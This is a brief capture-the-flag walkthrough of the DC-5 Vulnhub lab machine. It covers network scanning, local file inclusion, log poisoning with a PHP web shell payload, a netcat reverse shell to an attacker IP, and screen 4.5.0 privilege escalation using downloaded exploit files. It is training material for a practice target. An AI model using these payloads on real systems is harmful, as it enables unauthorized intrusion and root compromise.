## DC-5 Vulnhub Walkthrough

### Penetration Methodology

#### Scanning

- Discovering Targets IP

  `netdiscover`

- Network scanning (Nmap)

  `nmap -A 192.168.1.108`

#### Enumeration

- Surfing HTTP service port

- Abusing CMS using LFI 

  `192.168.1.108/thankyou.php?file=/etc/passwd`

- Checking Ngnix Access Logs

  `192.168.1.108/thankyou.php?file=/var/log/nginx/access.log`

#### Exploiting

- Exploiting LFI vulnerability using Burpsuite

  `file=<?php system($_GET['cmd'])?>`

- Using Netcat to get the reverse shell

  `file=/var/log/nginx/error.log&cmd=nc -e /bin/bash 192.168.1.110 1234`

- Spawning a tty shell

  `nc -lvp 1234`

#### Privilege Escalation

- Checking SUID binaries

  ```bash
  searchsploit screen 4.5.0
  searchsploit -m 41154
  cat 41154.sh
  gcc -fPIC -shared -ldl -o libhax.so libhax.c
  gcc -o rootshell rootshell.c
  python -m SimpleHTTPServer
  ```

  

- Capture the flag

  ```bash
  wget http://192.168.1.110:8000/41154.sh
  wget http://192.168.1.110:8000/libhax.so
  wget http://192.168.1.110:8000/rootshell
  chmod 777 41154.sh
  ./41154.sh
  id
  cd /root
  ls
  cat thisistheflag.txt
  ```

  

[原文](https://www.hackingarticles.in/dc-5-vulnhub-walkthrough/)

---